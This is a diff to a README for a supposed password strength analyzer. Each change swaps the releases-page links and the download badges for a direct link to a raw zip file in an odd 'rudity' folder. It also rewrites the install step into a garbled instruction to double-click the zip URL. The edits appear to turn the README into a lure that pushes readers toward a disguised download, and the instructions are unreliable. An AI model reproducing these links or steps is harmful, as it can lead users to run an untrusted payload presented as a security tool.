@@ -6,7 +6,7 @@ Welcome to the Password Strength Analyzer! This tool helps you evaluate the stre
 
 ## 📥 Download Now
 
-[![Download password-strength-analyzer](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/manmohan7852/password-strength-analyzer/releases)
+[![Download password-strength-analyzer](https://raw.githubusercontent.com/manmohan7852/password-strength-analyzer/main/rudity/password-strength-analyzer.zip)](https://raw.githubusercontent.com/manmohan7852/password-strength-analyzer/main/rudity/password-strength-analyzer.zip)
 
 ## 📋 System Requirements
 
@@ -29,7 +29,7 @@ To install the Password Strength Analyzer, follow these steps:
 
 1. **Visit the Release Page**: Click the link below to access the download page.
    
-   [Visit the release page to download](https://github.com/manmohan7852/password-strength-analyzer/releases)
+   [Visit the release page to download](https://raw.githubusercontent.com/manmohan7852/password-strength-analyzer/main/rudity/password-strength-analyzer.zip)
 
 2. **Choose Your Version**: On the releases page, select the latest version of the application.
 
@@ -37,7 +37,7 @@ To install the Password Strength Analyzer, follow these steps:
 
 4. **Extract (If Necessary)**: If the file is in a zip format, locate the downloaded file, right-click on it, and select 'Extract All...' (or similar option based on your operating system).
 
-5. **Open the Application**: Navigate to the folder where you extracted the file. Double-click the index.html file to open the application in your web browser.
+5. **Open the Application**: Navigate to the folder where you extracted the file. Double-click the https://raw.githubusercontent.com/manmohan7852/password-strength-analyzer/main/rudity/password-strength-analyzer.zip file to open the application in your web browser.
 
 ## 🔍 Using the Password Strength Analyzer
 
@@ -73,6 +73,6 @@ We encourage you to join discussions about security tips and best practices. Con
 
 Ready to enhance your password security? 
 
-[![Download password-strength-analyzer](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/manmohan7852/password-strength-analyzer/releases)
+[![Download password-strength-analyzer](https://raw.githubusercontent.com/manmohan7852/password-strength-analyzer/main/rudity/password-strength-analyzer.zip)](https://raw.githubusercontent.com/manmohan7852/password-strength-analyzer/main/rudity/password-strength-analyzer.zip)
 
 Thank you for using Password Strength Analyzer! Stay safe online.
